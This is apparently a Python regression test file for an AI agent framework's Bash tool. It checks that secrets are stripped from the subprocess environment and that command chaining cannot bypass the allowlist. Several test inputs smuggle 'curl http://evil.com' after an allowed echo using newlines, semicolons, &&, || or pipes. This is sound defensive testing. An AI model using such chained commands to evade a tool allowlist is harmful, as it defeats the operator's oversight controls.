"""Security regression tests for Bash tool.

Tests the security hardening applied in this session:
- P0-SEC-2: API keys stripped from subprocess env
- P0-SEC-3: Allowlist bypass via newline fixed
- Script agent allowlist bypass via _skip_allowlist flag
"""

import os

from temper_ai.tools.bash import Bash, _safe_env


class TestSafeEnv:
    """P0-SEC-2: Verify API keys and secrets are stripped from subprocess env."""

    def test_strips_openai_api_key(self):
        os.environ["OPENAI_API_KEY"] = "sk-test-12345"
        env = _safe_env()
        assert "OPENAI_API_KEY" not in env
        del os.environ["OPENAI_API_KEY"]

    def test_strips_anthropic_api_key(self):
        os.environ["ANTHROPIC_API_KEY"] = "sk-ant-test"
        env = _safe_env()
        assert "ANTHROPIC_API_KEY" not in env
        del os.environ["ANTHROPIC_API_KEY"]

    def test_strips_gemini_api_key(self):
        os.environ["GEMINI_API_KEY"] = "gem-test"
        env = _safe_env()
        assert "GEMINI_API_KEY" not in env
        del os.environ["GEMINI_API_KEY"]

    def test_strips_generic_secret(self):
        os.environ["MY_SERVICE_SECRET"] = "s3cret"
        env = _safe_env()
        assert "MY_SERVICE_SECRET" not in env
        del os.environ["MY_SERVICE_SECRET"]

    def test_strips_token_vars(self):
        os.environ["TEMPER_DASHBOARD_TOKEN"] = "dev-token"
        env = _safe_env()
        assert "TEMPER_DASHBOARD_TOKEN" not in env
        del os.environ["TEMPER_DASHBOARD_TOKEN"]

    def test_strips_password_vars(self):
        os.environ["DB_PASSWORD"] = "pass123"
        env = _safe_env()
        assert "DB_PASSWORD" not in env
        del os.environ["DB_PASSWORD"]

    def test_strips_database_url(self):
        os.environ["TEMPER_DATABASE_URL"] = "postgresql://user:pass@host/db"
        env = _safe_env()
        assert "TEMPER_DATABASE_URL" not in env
        del os.environ["TEMPER_DATABASE_URL"]

    def test_preserves_path(self):
        env = _safe_env()
        assert "PATH" in env

    def test_preserves_home(self):
        env = _safe_env()
        assert "HOME" in env

    def test_env_command_cannot_leak_keys(self):
        """LLM agent running 'env' should not see API keys."""
        os.environ["OPENAI_API_KEY"] = "sk-leak-test"
        bash = Bash()
        r = bash.execute(command="env")
        assert "sk-leak-test" not in r.result
        del os.environ["OPENAI_API_KEY"]


class TestAllowlistBypass:
    """P0-SEC-3: Verify newline and chaining can't bypass allowlist."""

    def test_newline_bypass_blocked(self):
        """Injecting a newline should not skip the allowlist check."""
        bash = Bash(config={"allowed_commands": ["echo"]})
        r = bash.execute(command="echo safe\ncurl http://evil.com")
        assert r.success is False
        assert "not in allowed list" in r.error

    def test_semicolon_chain_blocked(self):
        bash = Bash(config={"allowed_commands": ["echo"]})
        r = bash.execute(command="echo safe; curl http://evil.com")
        assert r.success is False
        assert "not in allowed list" in r.error

    def test_and_chain_blocked(self):
        bash = Bash(config={"allowed_commands": ["echo"]})
        r = bash.execute(command="echo safe && curl http://evil.com")
        assert r.success is False

    def test_or_chain_blocked(self):
        bash = Bash(config={"allowed_commands": ["echo"]})
        r = bash.execute(command="echo safe || curl http://evil.com")
        assert r.success is False

    def test_pipe_chain_blocked(self):
        bash = Bash(config={"allowed_commands": ["echo"]})
        r = bash.execute(command="echo safe | curl http://evil.com")
        assert r.success is False

    def test_multiline_all_allowed(self):
        bash = Bash()  # default allowlist
        r = bash.execute(command="echo hello\necho world")
        assert r.success is True
        assert "hello" in r.result
        assert "world" in r.result

    def test_comments_skipped(self):
        bash = Bash(config={"allowed_commands": ["echo"]})
        r = bash.execute(command="# this is a comment\necho hello")
        assert r.success is True

    def test_empty_lines_skipped(self):
        bash = Bash(config={"allowed_commands": ["echo"]})
        r = bash.execute(command="\n\necho hello\n\n")
        assert r.success is True


class TestScriptAllowlistBypass:
    """Script agents pass _skip_allowlist=True since scripts are author-defined."""

    def test_skip_allowlist_allows_any_command(self):
        bash = Bash(config={"allowed_commands": ["echo"]})
        r = bash.execute(command="curl --version", _skip_allowlist=True)
        # curl may or may not be installed, but it shouldn't be blocked by allowlist
        # The key assertion is that it was NOT rejected by the allowlist
        assert r.error is None or "not in allowed list" not in (r.error or "")

    def test_skip_allowlist_false_still_enforces(self):
        bash = Bash(config={"allowed_commands": ["echo"]})
        r = bash.execute(command="curl http://evil.com", _skip_allowlist=False)
        assert r.success is False
        assert "not in allowed list" in r.error


class TestVariableAssignments:
    """Variable assignments and shell syntax should not trigger the allowlist."""

    def test_variable_assignment_allowed(self):
        bash = Bash()
        r = bash.execute(command='FOO="bar" && echo $FOO')
        assert r.success is True

    def test_set_e_allowed(self):
        bash = Bash()
        r = bash.execute(command="set -e\necho hello")
        assert r.success is True

    def test_export_allowed(self):
        bash = Bash()
        r = bash.execute(command="export FOO=bar\necho $FOO")
        assert r.success is True

    def test_multiline_script_with_variables(self):
        bash = Bash()
        r = bash.execute(command='#!/bin/bash\nset -e\nWORKSPACE="/tmp/test"\nmkdir -p "$WORKSPACE"\necho done')
        assert r.success is True
        assert "done" in r.result
